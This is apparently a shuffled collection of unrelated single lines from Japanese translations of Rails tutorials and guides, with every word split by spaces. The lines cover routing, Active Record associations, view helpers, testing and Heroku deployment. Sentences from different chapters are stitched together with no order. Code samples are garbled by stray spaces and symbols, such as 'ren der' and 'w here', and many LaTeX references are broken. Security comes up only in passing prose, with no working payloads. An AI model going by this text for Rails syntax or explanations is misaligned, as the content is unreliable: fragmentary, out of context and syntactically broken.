Rails で は この よう な 場合 に 便利 な 、 非常 に シンプル な HTTP 認証 システム が 用意 さ れ て い ま す 。
また 、 この 時点 で Heroku に デプロイ し て み て も よ い で しょ う 。
この プリ コンパイル さ れ た ファイル が Web サーバー に よ っ て 静的 な アセット と し て 扱 わ れ ま す 。
    <%= yield  : special _script %>
たとえば 、 本章 で は サイト ヘッダー の ログ イン / ログ アウト リンク や プロフィール リンク を 改造 し ま す 。
以下 の コード で 使用 さ れ て い る 疑問 符 は 、 セキュリティ 上 重要 な 役割 を 果た し て い ま す 。
2 つ 目 の 違い は 、 先ほど の 逆 の ケース に つ い て で す ▟ 以前 は Micropost モデル で
resources  : books
秘密 トークン を 動的 に 生成 する 。
と い う Toy アプリケーション の コード   ( リスト \ ref{ code :rails_ routes_root _ route } ) ▟ そして 最後 は
エンジン で 記事 を 新規 作成 でき る よう に な り ま し た の で 、 今度 は 記事 に コメント を 追加 する 機能 も 付け て み ま しょ う 。
Bitbucket に 公開 鍵 を 追加 する に は 、 右上 に あ る アバター 画像 を クリック し て   [ Manage  account ] 、 [ SSH  keys ]   の 順 に 選択 し ま す   ( 図 \ ref { fig : add_ public _key} ) 。
12355 5 1234 ▖ to_s(:phone ,   country_ code :   1 )
リスト \ ref{ code : logo_css } の CSS の 結果 は 図 \ ref { fig : sample_app_ logo } で 確認 でき ま す 。
ユーザー 定義 の タイム ゾーン を 考慮 する メソッド を 使用 し て 日付 を 比較 し た い 場合 、 ` Date▖ today ` で は な く 必ず ` Date▖ current ` を 使用 し て くださ い 。
たとえば 、 以下 の ビュー の レンダリング 結果 は 上 で 紹介 し た レイアウト 内 に 挿入 さ れ ま す 。
たとえば 、 \ kode {: name } は シンボル で す 。
Date▖ new (2000 ,   3 ,   31 ) ▖ prev_month # =>  Tue ,   29   Feb   2000
#  find  an  order   dependency   and  want  to   debug  it ,   you  can   fix  the
\ ref{ sec : profile_micropost _tests } で は 、 次 の よう に 書 く こと で
*   1 つ の コメント は 1 つ の 記事 に 属 する   ( Each   comment   belongs  to   one   article ) 。
Time オブジェクト や Date オブジェクト 、 秒 を 表 す 整数 同士 を 比較 し て 近似 表現 を 返 し ま す 。
*   Rails   4 ▖ 0 で は ` Action Controller : : Base ▖ page_cache_extension ` オプション が 非 推奨 に な り ま し た 。
この メソッド は 、 Rails の 多く の クラス で 上書き さ れ て い ま す 。
これ は リスト \ ref{ code : log _ in_success } で 使用 さ れ て い ま し た 。
この 時点 で 、 Git の トピック ブランチ を master に マージ し て お き ま しょ う 。
デフォルト は `' signed cookie '` で す 。
    has_many  : deliveries , -> { extending   FindRecentExtension   }
また 、 この ルール に あ る 以下 の CSS は 、
くれぐれ も 、 条件 文字 列 の 中 に 引数 を 直接 置 く こと は し な い で くださ い 。
この よう に 、 Rails は 対応 する 名前 の パーシャル を 、 与え られ た リソース の ディレクトリ 内 から 探し に い く こと が でき ま す 。
  >>  Rails ▖env▖ test ?
上 の 記法 は 以下 と 完全 に 同一 で す 。
この 構成 で は 、 `user ▖ profile ▖ name ` の よう に プロファイル 越し に ユーザー 名 を 取得 する こと に な り ま す ▟ これ ら の 属性 に 直接 アクセス でき た ら もっと 便利 に な る こと で しょ う 。
これ は リスト \ ref{ code :stub _user_view } で 使用 さ れ て い ま し た 。
\ kode {user_ id } 属性 と 同様 、 \ kode {content } 属性 も 存在 する 必要 が あ り 、 さらに \emph { マイクロ } ポスト が 140 文字 より 長 く な ら な い よう 制限 を 加え ま す 。
この ディレクトリ に 置 か れ て い る ファイル は 、 フレームワーク の 読み込 み が すべて 読 み 終わ っ て から 行 い た い 設定 を 保存 し て お く の に も 使用 でき ま す 。
以下 に 例 を 示 し ま す 。
これ は 、 アプリケーション の 設定 が ほとんど の 場合 で 同じ なら ば 、 それ を デフォルト に す べ き で あ る と い う 考え に 基づ い て い ま す 。
*  `config▖ dependency _ loading ` を false に 設定 する と 、 定数 自動 読み込 み 設定 を オフ に し ま す 。
       create    README ▖ rdoc
以上 で 記事 の 作成 、 表示 、 一覧 表示 、 更新 、 削除 を ひととおり 実装 でき ま し た ▟ お 疲れ さま で し た !
" dude " ▖ pluralize ( 1 )   # => " dude "
#### ` bin ` ディレクトリ
この アクション が パブリック な API で 使用 さ れ て お り 、 HTTP メソッド を 自由 に 変更 でき な い の で あ れ ば 、 フォーム を 更新 し て ` PUT ` を 代り に 使用 でき ま す 。
最初 の ステップ と し て 、 マイクロ ポスト の パーシャル   ( リスト \ ref{ code :feed_item_ partial } )   に 削除 リンク を 追加 し ま す 。
get  '* a/foo/* b', to :  'test # index'
標準 的 な RESTful な URL を 通 し て 、 ユーザー 情報 を \emph { リソース } と し て 扱え る よう に な っ た
    #  ActiveRecord : : Relation を 返 す よう に する
上 の 例 に 示 し た よう に 、 標準 の バリデーション と カスタム バリデーション を 組み合わせ る こと も でき ま す 。
Copyright   ( c )   2013   Michael   Hartl
\ kode {config } ディレクトリ と い う 名前 の とおり 、 この ディレクトリ 内 に あ る ファイル は 、 Rails が アプリケーション の 設定 を 読み込 む 時 に 必要 に な り ま す 。
Active   Record の 関連 付け 機能 に よ り 、 2 つ の モデル の 間 に リレーションシップ を 簡単 に 宣言 する こと が でき ま す 。
1 つ の 文 で 複数 の オブジェクト を アサイン する と 、 それ ら は すべて 保存 さ れ ま す 。
$ ( document ) ▖ on   " page : change " ,  - >
この ビュー で は 埋め込 み Ruby を 使用 し て ユーザー 名 と メール アドレス を 表示 し て い ま す ▟ インスタンス 変数 \ kode {@user } が あ る こと を 前提 と し て い ま す 。
作成 する に は 、 ` create_` で 始ま る メソッド を 使用 し て くださ い 。
###   最小 値
### `errors▖ clear `
n >╼\end {enumerate}╼╼    \ subsection { 長 さ を 検証 する } %  ( fold) ╼    \ label{ sec : length_ validation}╼╼
( 2 番 目 の 要因 に つ い て は 、 \ ref{ sec : guard } で 紹介 する Guard を 導入 する こと で 改善 でき ま す ) 。
Ruby   on   Rails は 、 「 どこ か で 誰 か が うま く や っ て くれ て い る フレームワーク 」 で は あ り ま せ ん 。
これ で コード が だいぶ 良 く な り ま し た ▟ しかし 、 同じ 効果 を 複数 の リンク に 与え る と どう な る で しょ う か 。
これ は 、 Ruby の 柔軟 性 の 高 さ を 応用 し て 、 RSpec が テスト 用 の 独自 言語   ( \emph { Domain - Specific   Language :   DSL } )   を 定義 し て い る から で す 。
|                     |  422                | :unprocessable_entity            |
####  text _ area
\ kode{gravatar _ for } ヘルパー 用 の オプション の \ kode {: size } パラメーター を 定義 する 。
`initializer ` メソッド を 使用 し て 定義 さ れ た イニシャライザ は 、 定義 さ れ た 順序 で 実行 さ れ ま す ▟ ただし ` : before ` や `: after ` を 使用 し た 場合 を 除 き ま す 。
動的 に 生成 さ れ る メソッド
こう し た 事情 から 、 \ kode {update } アクション 自体 を テスト する に は リクエスト を 直接 発行 する 以外 に 方法 が あ り ま せ ん   (
##### `: polymorphic `
` : source ` オプション は 、 ` has_many : through ` 関連 付け に お け る 「 ソース の 」 関連 付け 名 、 つまり 関連 付け 元 の 名前 を 指定 し ま す 。
    Action Controller : : Helpers▖helpers_ path  =  app ▖helpers_ paths
`take ` メソッド は レコード を 1 つ 取り出 し ま す ▟ どの レコード が 取り出 さ れ る か は 指定 さ れ ま せ ん 。
duplicate  = array ▖ dup
テスト の 結果 を 図 \ ref { fig:blank_ signup _ password_digest } に 示 し ま す 。
▖
TIP:   すべて の ページ で 共有 さ れ て い る コンテンツ で あ れ ば 、 パーシャル を レイアウト で 使用 する こと が でき ま す 。
これ ら の ディレクトリ 中 の ファイル は   http://example ▖ com/stylesheets   の よう な リクエスト に よ っ て 自動 的 に 配信 さ れ ま す ▟ これ は 3 ▖ 0 以降 も 同様 で す 。
2008 年 4 月 に は 、 510,000 以上 の Web サイト が この 方法 で ハッキング さ れ 、 英国 政府 、 国連 など 多く の 重要 な サイト が 被害 に 遭 い ま し た 。
X : : Y: : Z ▖ parent # =>  X : : Y
[ ] ▖ to _ formatted_s(:db )             # => "null "
Active   Record は 、 読み込 ま れ る すべて の 関連 付け を 事前 に 指定 する こと が でき ま す 。
[ Go  to   your  Dashboard ]   を クリック し ま す 。
ステータス フィード の 最終 テスト 。
フォーム 送信 時 に エラー メッセージ を 表示 する ため の パーシャル
ルート ルーティング を 設定 する 。
上 の 結果 は My SQL の 場合 で す 。
    mail ( to :  user ▖email ,  ▖▖▖)
アプリケーション の テスト
通常 の ビュー で は 以下 の よう な 方法 で ` public/assets/images ` ディレクトリ の 画像 に アクセス でき ま す 。
% w ( 1   2   3   4   5   6   7 ) ▖ in_groups ( 3 ,   " 0 " )
その ため に ` : nodoc: ` を 指定 し て 、 ドキュメント に 含 ま れ な い よう に し て い ま す 。
*   悲観 的 ロック   ( pessimistic )
####  number_to_human_size
上 の コード は これ まで より も やや 複雑 に な っ て い ま す の で 、 順 に 見 て い く こと に し ま す 。
ren der  " books/edit "
#  config ▖mock_ with   :mocha
最初 に 行 っ た User ページ spec の 再現 。
use   ActionDispatch : : Callbacks
この メソッド は ` config▖ action_controller ▖ asset_host ` を 短縮 し た もの で す 。
class   Address  <  ActiveRecord : : Base
# =>  " BETWEEN   '2009 - 10 - 25 '   AND   '2009 - 10 - 26 ' "
HTML 5 を 使 っ て header や footer 、 logo や body と い っ た コンテンツ の レイアウト を 定義 し ま し た
def qualified_const_set ( path ,   value )
( パーシャル で は 、 自動 生成 せ ず に 、 テキスト エディタ を 使 っ て 手動 で 作成 する の が 一般 的 で す ▟ )
{ a : {b :   1 } }▖ deep _merge ( a : {c :   2 } )
      [▖▖▖ ]
WARNING :   上 の 例 で は 、 3 つ の キー の うち 最後 の 1 つ しか シンボル に 変換 さ れ て い な い こと に ご 注意 くださ い ▟ 数字 と nil は シンボル に な り ま せ ん 。
\ kode {update\_attributes } メソッド は 属性 の ハッシュ を 受け取 り 、 成功 時 に は 更新 と 保存 を 続け て 同時 に 行 い ま す   ( 保存 に 成功 し た 場合 は \ kode {true } を 返 し ま す ) 。
簡潔 かつ 宣言 的 に 書 く こと 。
\ kode {microposts } テーブル を 追加 する ため に データ モデル を 変更 し た の で 、 本番 データベース を マイ グレート する 必要 が あ り ま す 。
次 は 、 \ ref{ sec : planning_ the_application } と 同じ よう に 、 テキスト エディタ を 使 っ て \ kode { Gemfile } に 必要 な gem を 書き足 し て い き ま す 。
beginning _ of _week  ( at_beginning _ of _week )
どんな Rails アプリケーション も 最初 の 作成 手順 は 同じ で す ▟ \ kode {rails   new } コマンド を 実行 し て 作成 し ま す 。
class  Users Controller <  Application Controller
def  assign_route_options ( segments ,   defaults ,  requirements )
( \ kode {new } メソッド と 同様 に 、 \ kode {build } メソッド は オブジェクト を 返 し ま す が データベース に は 反映 さ れ ま せ ん ▟ )
* ` poster :   " image_name ▖ png " ` は 、 ビデオ 再生 前 に ビデオ の 位置 に 表示 し て お き た い 画像 を 指定 し ま す 。
  ▖▖▖
#   orders の キャッシュ コピー が 使用 さ れ る
\ kode { following } アクション と \ kode { followers } アクション
最初 に 、 Home ページ と Help ページ へ の リンク を 持 つ ヘッダー パーシャル \ kode {_header▖html ▖erb }  ( リスト \ ref{ code : header_ partial_links})   から 取りかか り ま す 。
</ li >
array [ 1 ] [ 2 ]  ==  nil    # => true
` : polymorphic ` オプション と 組み合わせ た 場合 は 無効 で す 。
id = \ texttt { 1 } の ユーザー を 検索 でき た の は 以上 の 仕組み に よ る もの で す   ( リスト \ ref{ code :user_ show _ action }  ) 。
2 つ 目 は ブロック を 使用 する 方法 で す 。
  $ ps  aux
あるいは 、 CSS や Java Script を 駆使 し て Web アプリケーション 上 の 本物 の リンク を 隠 し て 別 の リンク を 表示 し 、 ユーザー を 偽 の サイト に リダイレクト する と い う 手法 も あ り ま す 。
どう し て も 使用 し た い の で あ れ ば 、 以下 の よう に 、 必要 な 名前 空間 だけ に マッチ する よう に `: controller ` に 制限 を 加え ま す 。
ご 想像 の とおり 、 jQuery は CSS と 同様 、 ドット \ kode {▖ } を 使用 し て CSS クラス を 操作 でき ま す 。
続 い て 、 一意 の 有効 化 トークン が ユーザー 有効 化 に 必要 で す 。
ERB で ビュー を この よう に 書き換え て も 、 ページ の 表示 結果 は 以前 と まったく 同じ で す ▟ タイトル の 可変 部分 が ERB に よ っ て 動的 に 生成 さ れ て い る 点 だけ が 異な り ま す 。
1   example ,   0   failures ,   1   pending
TIP:   動的 な セグメント 分割 で は ドット ` ▖ ` を デフォルト で は 使用 でき ま せ ん ▟ ドット は フォーマット 済み ルーティング で は 区切り 文字 と し て 使用 さ れ る ため で す 。
       def  show
最後 に 、 利用 可能 な Active   Support を すべて 読み込 みた い 場合 は 以下 の よう に し ま す 。
{ 0 } 図 9 ▖ 14 : {/ 0 }   { 1 } 論理 値 を と る \ kode { admin } 属性 が 追加 さ れ た User モデル { / 1 }
上 の ERB コード で テスト ユーザー 用 の 有効 な パスワード を 作成 でき ま す 。
この 設定 は 、 ` config▖ active_ record ▖ schema_format  ==  : ruby ` で 「 な い 」 場合 は 無視 さ れ ま す 。
{ 0 } 図 7 ▖ 10 { / 0 }   { 1 } 現状 の ユーザー 登録 ページ     \ href { http://local host : 3000 / signup}{/ signup} { / 1 }
この コード を よく 観察 し て み る と 、 ` form _ for ` の 宣言 部分 以外 に は 元 の コード と の 違い が な い こと が わか り ま す 。
<%=   form _ for ( @user ,   remote:  true )   do  | f| %>
paginate メソッド や count メソッド は 、 どちら も 関連 付け を 通 し て 実行 さ れ 、 効率 的 に データベース に 問い合わせ し て い る
この 設定 を 使用 する と 、 ` postgresql ` を 使用 し て 、 `blog_development ` と い う 名前 の データベース に 接続 し ま す 。
*   he また は she ->  they に 置き換え る
   git   add : "▖ "
#   This   code  will   be  run  each time  you   run  your   specs▖
   Loading   development  environment
####  Postgre SQL データベース を 設定 する
Blorgh エンジン の 場合 、 ` app/controllers/blorgh/application_controller▖ rb ` を 以下 の よう に 変更 し ま す 。
\ kode { current\ _user } が 、 渡 さ れ た ユーザー と 同じ で あ る こと を 確認 し ま す 。
カスタム バリデーション を 実行 する
end _of_ year   ( at_end _of_ year )
{ 0 } 図 12 ▖ 17 { / 0 }   { 1 } ユーザー の フォロワー を 表示 する { / 1 }
続 い て この 変更 を コミット し 、 Heroku に プッシュ し ま す 。
メイラー の 構成 は コントローラ の アクション と よく 似 て お り 、 メール の テンプレート を ビュー と 同じ 要領 で 定義 でき ま す 。
d   =  Date▖ new (2012 ,   9 ,   10 )      # =>  Mon ,   10   Sep  2012
簡素 化 の ため 、 次 の よう な Unix スタイル の プロンプト   ( 行 の 頭 に 「 $ 」 を 表示 する スタイル )   を 使用 し て 、 その 例 が コマンドライン で あ る こと を 示 し て い ま す 。
Ruby で は 単なる 改行 は 無視 さ れ る の で 、 問題 あ り ま せ ん 。
~/ ▖irbrc
  <%=  f▖ text _ area   : body %><br>
Xcode は サイズ が 大き い の で 、 それ より も ずっと サイズ の 小さ い \ href {https://developer▖ apple ▖ com/downloads/}{ Command   Line   Tools   for  Xcode } を お 勧め し ま す
" foo\n\t\tbar " ▖indent ( 2 )  # => "\t\tfoo\n\t\t\t\tbar "
次 の 手順 は 、 \ kode {authenticate } メソッド を 使用 し て 、 受け取 っ た パスワード が ユーザー の パスワード と 一致 する こと を 確認 し ま す 。
#### ` to_date` 、 ` to_time` 、 ` to_datetime`
キャッシュ データ が 不明 な 定数 を 参照 し て い る 場合 、 自動 読み込み が トリガ さ れ ま す ▟ 読み込み に 成功 し た 場合 は 非 直列 化 を 透過 的 に 再 試行 し ま す 。
` http://example ▖ com/main▖css ` を 含め る に は 以下 の よう に し ま す 。
最後 に 、
\ kode { params } ハッシュ の この 値 を 調べ れ ば 、 送信 さ れ た 値 に 基 い て ユーザー を 記憶 し たり 忘れ たり でき る よう に な り ま す
IDE   で の 開発 が 好み と い う 方 は 、 先ほど 挙げ た リンク を チェック し て み て 、 自分 の スタイル に 合 う か どう か 試し に 使 っ て み る と よ い で しょ う 。
特に 、 キー が 存在 し な い 場合 は ハッシュ が \ kode {nil } を 返 す の で 、
  >> @user  = @user || " the  user "
同時 に 、 ` preview_ photo _url` ヘルパー と ` preview_ photo _ path ` ヘルパー も 作成 さ れ ま す 。
|  HTTP   動詞   |   パス                   |  コントローラ # アクション    |   名前 付き ヘルパー               |
      t ▖ datetime : appointment_date
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
| `{  " person " : [ ] }`                | `{ : person  => nil  }`     |
*   これ は ` image_tag ` に 対 する 標準 的 な 呼び出し で あ る ため 、 画像 ファイル を 扱 う 時 と 同様 、 添付 URL の 後 に も オプション の ハッシュ を 1 つ 置 く こと が でき ま す 。
Content- Type :  text /html
Article ▖ w here ( author :   author )
    adapter :  jdbcmysql
先進 的 な 分野 で 推奨 さ れ て い る 慣用 表現 を 使用 する こと 。
#   1 つ 目 の 要素 は 複製 さ れ て い な い の で 、 一方 を 変更 する と どちら の 配列 も 変更 さ れ る
この 演習 を まだ や っ て い な い 場合 は 、 リスト \ ref{ code :gravatar _option_redux } に 従 っ て Users ヘルパー ファイル を 更新 し て から 先 に 進 ん で くださ い 。
hash = { a :   1 ,  b :   2 } ▖ with _indifferent_access
get  : index
####  メンバー ルーティング を 追加 する
{ 0 } リスト 2 ▖ 6 { / 0 } ╼╼ { 1 } Toy アプリケーション の User モデル { 2 } { / 2 }   { 3 } app/models/user▖ rb { / 3} { / 1 }
作成 し た コード を リスト \ ref{ code :remember_token_should _ not_be_blank } に 示 し ま す
標準 的 な 名前 で あ れ ば 、 ほとんど の 関連 付け で 逆 関連 付け が サポート さ れ ま す 。
###  メイラー 生成 の 全 手順
タイトル の 可変 部分 を ERB を 使 っ て 置き換え た の で 、 現在 それぞれ の ページ は だいたい 以下 の よう な 構造 に な っ て い ま す 。
#### select_date
この 宣言 に よ っ て 、 アプリケーション の すべて の ビュー で 使用 さ れ る レイアウト は ` app/views/layouts/main▖html ▖erb ` に な り ま す 。
#   記憶 トークン cookie に 対応 する ユーザー を 返 す
上 を 以下 の よう に 変更 し ま し た 。
gem  'mysql 2 ' 
\ kode {remember } メソッド の 次 の 行 で は 、 \ kode {update_attribute } メソッド で 記憶 ダイジェスト を 更新 し て い ま す
さらに 、 Rails は 最新 の Web テクノロジー や フレームワーク 設計 に 素早 く 適応 し て い ま す 。
### `yield ` を 理解 する
index
    member  do
さらに 、 テスト データベース は たまに 壊れ る こと が あ る の で 、 その 場合 は リセット が 必要 で す 。
上 の コード で は \ kode {let } が もう 一 度 使用 さ れ て お り 、 さらに \ kode { specify } と い う メソッド も 使用 さ れ て い ま す 。
この とき の ` params ` は `{  controller :  'photos' ,   action :  'show ',  id :   ' 1 ' ,  user_ id :   ' 2 '  }` と な り ま す 。
以下 の コード を 使用 し て
$  git   fetch  rails
stylesheet_link_tag  : all
scope   shallow_ prefix :  " sekret "   do
#### strip_links (html )
{ 0 } 図 5 ▖ 6 { / 0 } { 1 } デザイン さ れ た ロゴ と サンプル アプリ ▟ \ href { http://railstutorial ▖org / images/figures/sample_app_ logo _ 4 _ 0 - full ▖ png } { ( 拡大 ) } { / 1 }
----------------------
class   A
従 っ て 、 パスワード の 再 設定 で は 必ず ダイジェスト を 使用 し て くださ い 。
#### `image_tag ` を 使用 し て 画像 に リンク する
最後 に 、 signup ページ 用 の カスタム スタブ   ( stub )   の ビュー を 追加 し ま す   ( \ ref{ code :initial_ signup _ page } ) 。
( RVM が インストール 済み の 場合 、 以下 を 実行 し て
```apache
完全 な 実装 は 第 11 章 「 ユーザー を フォロー する 」 を 参照 し て くださ い 。
adapter は 重複 し て い る の で 、 ` ENV [ ' DATABASE _ URL '] ` の 接続 情報 が 優先 さ れ て い ま す 。
` has_many ` 関連 付け に オブジェクト を アサイン する と 、 外部 キー を 更新 する ため に その オブジェクト は 自動 的 に 保存 さ れ ま す 。
$  git   push   heroku
dup [ : b ] [: d ]  <<   5
エンジン 内 の 他 の コンポーネント と 同様 、 アセット も 名前 空間 化 さ れ る 必要 が あ り ま す 。
GitHub から Ruby   on   Rails に 送信 さ れ た プルリクエスト   ( pull   request 、 プルリク と も )   を チェック し て くれ る 人 も い る と 助か り ま す 。
これ は \emph{system } セットアップ と 呼 ば れ 、 使用 する コンピュータ 1 台 に つ き 1 回 だけ 行 い ま す 。
### ` content_ for ` を 使用 する
データベース から 取り出 し た ユーザー の 一覧 を User モデル から コントローラ に 返 す 。
secure_ password の ソース コード に は 以下 の 行 が あ り ま す 。
まず は 、 \ kode { site\_ layout } と い う テスト の テンプレート を 生成 する ところ から 始め て み ま す 。
first ▖ last @ foo▖ jp
図 \ ref { fig : activated_user } の よう に な り ま し た 。
* `ActiveSupport: : Logger ▖ silencer ` を `false ` に 設定 する と 、 ブロック 内 で の ログ 出力 を 抑制 する 機能 が オフ に な り ま す 。
" Product " ▖ demodulize                        # =>  " Product "
上 の 例 で は 、 昨日 作成 さ れ た すべて の クライアント を 検索 し ま す ▟ 内部 で は SQL の ` BETWEEN ` 文 が 使用 さ れ ま す 。
####  JRuby プラットフォーム で SQLite 3 データベース を 設定 する
管理 ユーザー 向け の ファクトリー を 追加 する 。
###  健全 性 チェック
リスト \ ref{ code :micropost _ form } の フォーム が 動 く よう に する ため に は 、 2 箇所 の 変更 が 必要 で す 。
  = >   1
a 2 ▖ x  # = >   2   ( a 2 で オーバーライド さ れ る )
[   Proc▖ new { |filename ,   path|   path =~ /app \/assets/ && !
孤立 し た レコード が データベース に 残 っ て しま う 可能 性 が あ り ま す 。
これ は リスト \ ref{ code : real_account_activation_test } で 使用 さ れ て い ま し た 。
\ kode { has\_many } メソッド に は 、 クラス 名 や 外部 キー など 、 いく つ も の オプション を 渡 す こと が でき る ▟ たとえば
( この 後 の 章 で も 多く の 実例 を 紹介 し ま す ) 。
` w here ` 条件 が な い 場合 は 、 通常 の クエリ が 2 セット 生成 さ れ ま す 。
       create   app/assets/javascripts/application ▖ js
   belongs_to  : physician
*  `active_ support▖initialize_beginning _ of _week`: `config▖ beginning _ of _week ` の 設定 に 基づ い て アプリケーション の デフォルト の 週 開始 日 を 設定 し ま す ▟ デフォルト 値 は ` : monday ` で す 。
### `:if ` や `:unless ` で 文字 列 を 使用 する
この ディレクトリ に は ` bin/rails ` と い う ファイル が 1 つ だけ 置 か れ ま す ▟ これ は アプリケーション 内 で 使用 し て い る の と 似 た ` rails ` サブ コマンド で あ り 、 ジェネレータ で す 。
#   ActionDispatch : : ShowExceptions を Lifo : : ShowExceptions で 置き換え る
ハッシュ は 、 本質 的 に は 配列 と 同じ で す が 、 インデックス と し て 整数 値 以外 の もの も 使用 でき る 点 が 配列 と 異な り ま す
`welcome` コントローラ で 行 っ た とき と 同様 、 ` comments ` を 参照 する ため に Rails が 知 っ て お く べ き ルーティング を 追加 する 必要 が あ り ま す 。
今回 も いつ も の よう に テスト を 作成 する ところ から 始め ま す 。
上 で 紹介 し た その 他 の バリデーション に つ い て は 、 特定 の 状況 に 応 じ て 適宜 追加 し て くださ い 。
config▖ action_dispatch▖ default _headers▖ clear
Active   Record の `: inverse _of ` オプション を 使用 すれ ば これ ら の 関係 を 通知 する こと が でき ま す 。
従 っ て 、 この 結果 は その まま クエリ 文字 列 と し て 使用 でき ま す 。
####  期間
`t ▖ references ` と い う 書式 を 使用 する と さらに シンプル に でき ま す 。
get  'photos/: id ' , to :  'photos# show '
id = \ kode { 1 } の ユーザー を 更新 する アクション
   <option   value = " 1 " >Egypt< /option >
引数 に \emph { デフォルト } 値 を 含め て い る から で す   ( この 例 の デフォルト 値 は 空 の 文字 列 で す ) 。
たとえば 次 の よう に な り ま す 。
ユーザー の \ kode {update } アクション  
正し く インストール さ れ た か どう か を 確認 する に は 、 以下 の コマンド を 実行 し て バージョン を 確認 し て くださ い 。
` present ? ` メソッド は ` ! blank ? ` メソッド と 同等 で す 。
ルーティング ファイル に 以下 が 記載 さ れ て い る と し ま す 。
###   動的 コンパイル
` parameterize ` メソッド は 、 レシーバ を 正し い URL で 使用 可能 な 形式 に 正規 化 し ま す 。
アプリケーション の コード や 実行 環境 を セキュア に する 方法 に つ い て は 、 本 ガイド の 範疇 を 超え ま す 。
これ は Factory   Girl に 問題 が あ る わけ で は な く 、 あくまで \emph { 機能 } の 一部 で あ り 、 バグ で は あ り ま せ ん 。
\ kode {length } の よう に 、 インスタンス に 対 し て 呼び出 す メソッド は \emph { インスタンス メソッド } と 呼 ば れ ま す 。
上 の よう に 変更 する こと で 、 `@products ` コレクション の インスタンス に `item ` と い う 名前 の ローカル 変数 経由 で アクセス でき ま す 。
デフォルト の ヘッダー
現 時点 の 状態 で フォーム を 再度 送信 する と 、 ` show ` アクション が な い と い う メッセージ が Rails から 返 さ れ ま す 。
この ディレクトリ 名 と ファイル 名 は 、 どちら も 重要 で す 。
##### `: as `
詳し く は RailsCast の   “ \ href { http://railscasts▖ com/episodes/77 - destroy - without - javascript} { Java Script を 使 わ な い 削除 } ”   ( 英語 )   を 観 て くださ い 。
この 時点 で 、 アプリケーション は 重要 な 警告 と 共 に メール アドレス の 一意 性 を 強制 し 、 テスト スイート も パス する はず で す 。
` new ` メソッド を 使用 し た 場合 は 、 オブジェクト は 保存 さ れ ず に インスタンス 化 さ れ ま す 。
##### `DateTime▖ current `
この 問題 の 根本 は 、 必要 な 抽象 化 を 行な っ て い な い こと で す 。
実際 の パラメータ が どの よう に な っ て い る か を 確認 する ため に 、 ` create ` アクション に 以下 の 変更 を 加え て み ま しょ う 。
User ▖find _each ( batch_ size :   500 0 )   do  |user |
それ に 続 い て ルート URL に リダイレクト し 、 フラッシュ メッセージ を ユーザー に 表示 し ま す 。
{ 0 } 図 9 ▖ 4 { / 0 } { 1 } \ href { http://gravatar ▖ com/}{ Gravatar } の 画像 調整 インターフェイス   ( 写真 は \ href { http://www ▖michaelhartl▖ com/}{ 誰 か さん } ) { / 1 } 。
スコープ に は 引数 を 渡 す こと が でき ま す 。
\ kode { name } 属性 の 検証 に 対 する 、 失敗 する テスト 。
今度 は 、 ページ 間 を 移動 する ため の リンク を 追加 し て み ま しょ う 。
Strong   Parameters 、 再び
   #  ここ に 例外 処理 を 書 く
また 、 一般 の Ruby 入門 書 で 扱 っ て い る 内容 と も 多少 異な っ て い ま す 。
{ id :   89 ,  name :  " John   Smith " }▖ to_query ( 'user' )
数値 を パーセント 文字 列 に 変換 し ま す 。
    get  'two' => 'test # example ' ,  as :   : example
続 い て リモート リポジトリ に プッシュ し 、 Heroku に デプロイ し ま す 。
 *  compiled  file ,  but it's   generally  better  to   create a   new file   per style
定数 名 は シンボル と し て 返さ れ ま す 。
###  ハッシュ を 使用 し た 条件
\ href { http://aws▖ amazon ▖ com/}{ Amazon   Web   Services } アカウント に サイン アップ する
Hi ,  Mr▖ <% puts  " Frodo " %>
{ 0 } リスト 2 ▖ 8 { / 0 } ╼╼ { 1 } Rails ルート で 使用 する Microposts リソース 用 の ルール { 2 } { / 2 }   { 3 } config/ routes▖rb { / 3} { / 1 }
HTTP の PUT メソッド 、 DELETE メソッド を 実現 する ため の ミドルウェア で す 。
この 指定 を 外 す 際 は 、 必ず コア チーム の 誰 か か コード の 著者 に 相談 し て から に し て くださ い 。
手強 い 課題 に 挑 む の で す から 、 ここ で 実装 す べ き 内容 を 慎重 に 見直 す こと が 重要 で す 。
以前 は この よう な 引数 を 使用 する と ` ActiveRecord : : AssociationTypeMismatch ` 例外 が 発生 し ま し た 。
これ を 行 う に は 、 以下 の よう に 記述 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : close _route } に 示 し ま す 。
12345678 90 ▖ to_s(:human )         # =>  " 1 ▖ 23   Billion "
まず は \ kode { get } メソッド を 使 っ て ユーザー 登録 ページ に アクセス し ま す 。
アプリケーション の コード は 既に 動作 する よう に な っ て い る の で 、 ここ で テスト を 実行 する と   \ passing   に な る はず で す 。
\ label{ cha : rails_flavored _ruby }
NOTE :   この オプション を 指定 し て も 、 実際 の アクション 名 が 変更 さ れ る わけ で は あ り ま せ ん 。
この よう な 問題 が 発生 し た 場合 は 、 アプリケーション の ルーティング メソッド を 、 `main_app ` と い う プレフィックス を 付け ず に エンジン から 呼びだ そ う と し て い な い か どう か を 確認 し て くださ い 。
静的 な ページ の ルーティング 一覧
` config▖ cache_classes ` が オン の 場合 は この オプション は 無視 さ れ ま す 。
|                     |  30 6                | : reserved                         |
Web アプリケーション の 場合 、 「 ドメイン ロジック 」 は ユーザー や 記事 、 商品 など の データ モデル に 相当 し 、 ユーザー インターフェイス は Web ページ を 指 し ま す 。
curl を 使用 し て 、 サーバー と CD N に それぞれ リクエスト を 送信 し 、 ヘッダー が 同じ で あ る か どう か を 以下 の よう に 確認 でき ま す 。
リスト \ ref{ code : password _ reset_update_action } の テンプレート を 埋め て 、 期限 切れ の パスワード 再 設定 の ブランチ   ( リスト \ ref{ code : password _ reset_expire_test } )   の 統合 テスト を 作成 し て くださ い
この アプリケーション に 必要 な Gem の 定義 ファイル
ちなみ に 、 ここ に flash の テスト も 追加 し て お く と よ い で しょ う ▟ これ は 演習 と し て 残 し て お き ま す   ( \ ref{ sec : signup _exercises} ) 。
# ruby - gemset = railstutorial_rails _ 4_ 0
一般 に 、 セキュリティ 修正 と バグ 修正 は 、 バック ポート の 候補 に な り ま す ▟ 新 機能 や 動作 変更 用 パッチ は バック ポート の 候補 に は 採り入れ られ ま せ ん 。
実際 に 体験 し て もら う ため に 、 今回 は テスト 駆動 開発 を 使 っ て ユーザー の 編集 機能 を 実装 し て み ま しょ う 。
ブログ エンジン で 最初 に 生成 す べ き は ` Article ` モデル と それ に 関連 する コントローラ で す 。
` belongs_to ` 関連 付け を 宣言 し た ら 、 対応 する 外部 キー を 作成 する 必要 が あ り ま す 。
パーシャル レイアウト
